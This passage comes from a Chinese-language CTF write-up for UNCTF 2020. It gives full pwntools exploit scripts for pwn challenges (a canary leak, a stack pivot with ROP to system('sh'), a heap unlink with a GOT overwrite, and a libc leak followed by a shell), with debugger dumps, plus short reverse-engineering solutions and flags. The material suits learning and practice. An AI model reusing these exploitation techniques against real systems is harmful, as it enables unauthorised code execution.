have?\n"</span>,str(time))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(time<span class="number">-2</span>):</span><br><span class="line">	p.recvuntil(<span class="string">"th girlfriends:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"16"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"th girlfriends:"</span>)</span><br><span class="line">p.sendline(<span class="string">"+"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"th girlfriends:"</span>)</span><br><span class="line">p.sendline(<span class="string">"+"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"16  16  16  16  16  16  16  16  16  16  "</span>)</span><br><span class="line">canary1=int(p.recv(<span class="number">10</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">canary2=int(p.recv(<span class="number">12</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">canary=canary1+canary2*<span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary1 : "</span>+hex(canary1)+<span class="string">"***************************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary2 : "</span>+hex(canary2)+<span class="string">"***************************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary : "</span>+hex(canary)+<span class="string">"***************************************"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"you can change your girlfriend\n"</span>,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"which girlfriend do you want to change?"</span>,<span class="string">"27"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(canary1))</span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(canary2))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(back_door))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span><span class="number">-15</span>):</span><br><span class="line">	p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="原神"><a href="#原神" class="headerlink" title="原神"></a>原神</h4><p>考点</p>
<p>1.gdb 默认调试子进程，改成父进程即可。</p>
<p>2.程序关闭了 stdout，可以 将输出流 &gt; 其它流上面。</p>
<p>3.栈迁移</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看系统默认的follow-fork-mode ：</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> follow-fork-<span class="keyword">mode</span></span><br><span class="line"></span><br><span class="line">设置follow-fork-<span class="keyword">mode</span> ：</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> follow-fork-<span class="keyword">mode</span> [<span class="keyword">parent</span>|<span class="keyword">child</span>]</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/unctf2020/yaunshen.png" alt=""></p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./GenshinSimulator'</span>)</span><br><span class="line"><span class="comment">#p=remote('219.152.60.100',54232)</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./GenshinSimulator'</span>)</span><br><span class="line">read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">system = <span class="number">0x400C8C</span></span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x400b24</span></span><br><span class="line">ret=<span class="number">0x400b25</span></span><br><span class="line">rdi = <span class="number">0x400d13</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'[2]'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x602600</span>)+p64(<span class="number">0x400c63</span>))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  0x400c63    lea    rax, [rbp - 0x30]          #0x602600-0x30==0x6025d0</span></span><br><span class="line"><span class="string"> ► 0x400c67    mov    edx, 0x58</span></span><br><span class="line"><span class="string">   0x400c6c    mov    rsi, rax</span></span><br><span class="line"><span class="string">   0x400c6f    mov    edi, 0</span></span><br><span class="line"><span class="string">   0x400c74    call   read@plt &lt;0x400740&gt;       #read(0,0x6025d0,0x58)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RBP  0x602600 —▸ 0x6025d8 ◂— 0xdeadbeef</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10gx 0x6025d0</span></span><br><span class="line"><span class="string">0x6025d0:	0x0068730000000000	0x00000000deadbeef</span></span><br><span class="line"><span class="string">0x6025e0:	0x0000000000400b25	0x0000000000400d13</span></span><br><span class="line"><span class="string">0x6025f0:	0x00000000006025d5	0x0000000000400c8c</span></span><br><span class="line"><span class="string">0x602600:	0x00000000006025d8	0x0000000000400b25</span></span><br><span class="line"><span class="string">0x602610:	0x0000000000400b25	0x0000000000400b25</span></span><br><span class="line"><span class="string">pwndbg&gt; </span></span><br><span class="line"><span class="string">0x602620:	0x0000000000400b24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RBP  0x6025d8 ◂— 0xdeadbeef</span></span><br><span class="line"><span class="string"> RSP  0x602608 —▸ 0x400b25 ◂— ret    </span></span><br><span class="line"><span class="string"> RIP  0x400ca1 ◂— ret    </span></span><br><span class="line"><span class="string">────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────</span></span><br><span class="line"><span class="string">   0x400c8c    call   system@plt &lt;0x400700&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   0x400c91    mov    edi, 1</span></span><br><span class="line"><span class="string">   0x400c96    call   close@plt &lt;0x400730&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   0x400c9b    mov    eax, 0</span></span><br><span class="line"><span class="string">   0x400ca0    leave  </span></span><br><span class="line"><span class="string"> ► 0x400ca1    ret    &lt;0x400b25&gt;</span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> RBP  0x6025d8 ◂— 0xdeadbeef</span></span><br><span class="line"><span class="string"> RSP  0x602628 ◂— 0x0</span></span><br><span class="line"><span class="string"> RIP  0x400b24 ◂— leave  </span></span><br><span class="line"><span class="string">──────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string"> ► 0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string"> ► 0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string"> ► 0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400d13    pop    rdi</span></span><br><span class="line"><span class="string">   0x400d14    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400c8c    call   system@plt &lt;0x400700&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\x00\x00\x00\x00\x00sh\x00'</span>+p64(<span class="number">0xdeadbeef</span>)+p64(ret)+p64(rdi)+p64(<span class="number">0x6025d5</span>)+p64(system)+p64(<span class="number">0x6025d8</span>)+p64(ret)+p64(ret)+p64(ret)+p64(leave))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">'exec /bin/sh 1&gt;&amp;2'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h4><p>程序流程=&gt;</p>
<p>1.关闭了fastbin</p>
<p>2.菜单题，add delete，edit，没有show函数</p>
<p>3.got表可改</p>
<p>考点=&gt;</p>
<p>1.unlink</p>
<p>2.堆构造</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./baby_heap"</span>)</span><br><span class="line"><span class="comment">#p=remote("node2.hackingfor.fun",32991)</span></span><br><span class="line">elf=ELF(<span class="string">"./baby_heap"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size?\n"</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">"content?\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,new_content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">"what is your new content ?\n"</span>,new_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index ?\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line">globals = <span class="number">0x602160</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">"a"</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">FD = globals+<span class="number">16</span><span class="number">-0x20</span></span><br><span class="line">BK = globals+<span class="number">16</span><span class="number">-0x10</span><span class="number">-0x8</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(FD)+p64(BK)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'A'</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>) + p8(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment">#atoi_got = elf.got['atoi']</span></span><br><span class="line">malloc_got=elf.got[<span class="string">'malloc'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_got"</span>+hex(free_got)+<span class="string">"********************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got"</span>+hex(puts_got)+<span class="string">"********************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt"</span>+hex(puts_plt)+<span class="string">"********************************"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(free_got)</span><br><span class="line">                    <span class="comment">#0                 #1              #2</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x40097f</span>))          <span class="comment">#free_got -&gt;puts_plt</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)                        <span class="comment">#puts(puts_got)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="keer’s-bug"><a href="#keer’s-bug" class="headerlink" title="keer’s_bug"></a>keer’s_bug</h4><p>漏洞点=&gt;read函数存在栈溢出</p>
<p>利用思路=&gt; 先栈迁移到bss 段 然后leak libc ，有了libc后。然后再栈迁移下去getshell。</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./keer")</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,<span class="number">36099</span>)</span><br><span class="line">elf=ELF(<span class="string">"./keer"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x601160</span>+<span class="number">0x200</span><span class="comment">#0x601360</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400673</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400671</span></span><br><span class="line">jmp_rbp_content=<span class="number">0x400783</span></span><br><span class="line">leave_ret=<span class="number">0x40060D</span></span><br><span class="line">start_addr=<span class="number">0x4004C0</span> </span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Come on!! You can ri keer!!!\n"</span>)</span><br><span class="line"></span><br><span class="line">pd=<span class="string">"a"</span>*<span class="number">0x50</span>+p64(bss_addr)+p64(<span class="number">0x4005ED</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pd=<span class="string">"a"</span>*<span class="number">0x8</span>+p64(pop_rsi_r15_ret)+p64(write_got)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(write_plt)+p64(start_addr)+<span class="string">"flag\x00\x00\x00\x00"</span>*<span class="number">2</span>+p64(<span class="number">0x601310</span>)+p64(leave_ret) <span class="comment">#flag_addr:0x601350</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_addr=<span class="number">0x601350</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">write_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr : "</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : "</span>+hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr : "</span>+hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_sh : "</span>+hex(bin_sh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Come on!! You can ri keer!!!\n"</span>)</span><br><span class="line">		<span class="comment">#0x601660</span></span><br><span class="line">pd=<span class="string">"a"</span>*<span class="number">0x50</span>+p64(bss_addr+<span class="number">0x200</span>+<span class="number">0x100</span>)+p64(<span class="number">0x4005ED</span>)</span><br><span class="line">p.sendline(pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">start=<span class="number">0x4005B6</span></span><br><span class="line">pd=<span class="string">"aaaaaaaa"</span>+p64(pop_rsi_r15_ret)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)+p64(start_addr)+<span class="string">"aaaaaaaa"</span>*<span class="number">2</span>+p64(<span class="number">0x601310</span>+<span class="number">0x200</span>+<span class="number">0x100</span>)+p64(leave_ret)                                  <span class="comment">#read(3,bss_addr,len)</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="re-checkin"><a href="#re-checkin" class="headerlink" title="re_checkin"></a>re_checkin</h4><p>ida打开，搜索字符串，找到主程序</p>
<p><img src="/images/unctf2020/image-20201115161253904.png" alt="img"></p>
<p>输出success的条件是输入的Str1与Str2相等。查看Str2，看到很多字节数据，都存在于sub_4015DC函数。进入这一函数：</p>
<p><img src="C:%5CUsers%5CDrizzle%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201115161509640.png" alt="image-20201115161509640"></p>
<p>从上往下，得到flag</p>
<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>利用pyinstxtractor.py拆解exe为pyc</p>
<p>直接执行python pyinstxtractor.py run.exe得到run.pyc，利用在线工具进行反编译，得到python代码如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">'UMAQBvogWLDTWgX"""k'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    flag += chr(ord(str2[i]) + i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<p>直接运行得到flag。</p>
<p>flag：UNCTF{un_UN_ctf123}</p>
<h4 id="easyMaze"><a href="#easyMaze" class="headerlink" title="easyMaze"></a>easyMaze</h4><p>比较简单，ida找到数据块，静态审计确定为10*10的迷宫</p>
<p><img src="/images/unctf2020/image-20201115185606658.png" alt="img"></p>
<p><img src="/images/unctf2020/image-20201115185310796.png" alt="img"></p>
<p>o是路径 O是起点 0是墙 S是终点</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O<span class="meta">o00</span>oD<span class="number">00</span>SD</span><br><span class="line"><span class="number">0</span>ooo<span class="meta">o0</span>Dooo</span><br><span class="line"><span class="meta">o0</span>D<span class="number">0</span>oD<span class="number">0</span><span class="meta">o00</span></span><br><span class="line">oooo<span class="meta">o00</span><span class="meta">o00</span></span><br><span class="line">oD<span class="number">0</span>D<span class="number">0</span>ooooo</span><br><span class="line"><span class="meta">o00</span><span class="meta">o0</span><span class="meta">o0</span><span class="meta">o0</span>o</span><br><span class="line">oDoooooDDD</span><br><span class="line"><span class="meta">o00</span><span class="meta">o00</span>oooo</span><br><span class="line">oD<span class="number">0</span>D<span class="number">0000</span>oD</span><br><span class="line">oooooooooD</span><br></pre></td></tr></table></figure></div>

<p>走一遍，得到flag</p>
<p>flag：unctf{dsdddssaaaassssssddddddddwwaawawwddwwwdw}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h4><p>题目附件：</p>
